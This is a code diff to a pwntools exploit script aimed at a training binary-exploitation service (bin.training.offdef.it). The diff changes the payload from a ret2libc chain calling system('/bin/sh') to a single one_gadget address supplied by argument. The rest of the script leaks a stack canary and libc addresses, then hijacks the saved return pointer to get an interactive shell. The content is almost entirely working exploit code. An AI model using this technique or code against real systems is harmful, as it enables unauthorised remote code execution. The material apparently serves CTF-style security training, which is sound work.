@@ -107,6 +107,10 @@ def leak_libc(r, buffer, canary, sRIP):
     r.recvrepeat(timeout=0.2)
     return leak_libc
 
+one_gadget=0x00
+if args["ONE_GADGET"]:
+    one_gadget = args["ONE_GADGET"]
+
 if args["REMOTE"]:
 	r = remote("bin.training.offdef.it", 3003)
 else:
@@ -122,7 +126,6 @@ pop_rdi = 0x2a3e5
 pop_rax_rdx_rbx = 0x90528
 pop_rsi = 0x2be51
 syscall = 0x29db4
-one_gadget = 0x50a37
 bin_sh = 0x1d8698
 
 
@@ -161,11 +164,12 @@ r.sendline(str(canary).encode())    # canary
 time.sleep(0.2)
 r.sendline(b"")                     # sRBP (main)
 time.sleep(0.2)
-r.sendline(str(libc_pop_rdi).encode())   # sRIP (main) / gadget
-time.sleep(0.2)
-r.sendline(str(libc_bin_sh).encode())
-time.sleep(0.2)
-r.sendline(str(libc_system).encode())
-time.sleep(0.2)
+r.sendline(str(libc_one_gadget).encode())   # sRIP (main) / gadget
+#r.sendline(str(libc_pop_rdi).encode())   # sRIP (main) / gadget
+#time.sleep(0.2)
+#r.sendline(str(libc_bin_sh).encode())
+#time.sleep(0.2)
+#r.sendline(str(libc_system).encode())
+#time.sleep(0.2)
 
 r.interactive()
